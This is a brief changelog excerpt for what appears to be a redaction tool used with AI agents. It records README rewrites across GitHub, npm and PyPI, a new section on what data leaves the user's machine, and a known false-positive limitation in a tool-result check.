- Added "What leaves your machine" to all READMEs.
- Rewrote the GitHub, npm and PyPI READMEs around one path: what it is, one-command install per agent, a reproducible redaction check, what Scrubber / Galvanize / Scan do today (roadmap marked separately), data flow, measured numbers only, configuration, FAQ, security. Badges limited to CI, version and license.
- Documented a known limitation: false positives on whole source files in `check_tool_result` (not fixed in this release).
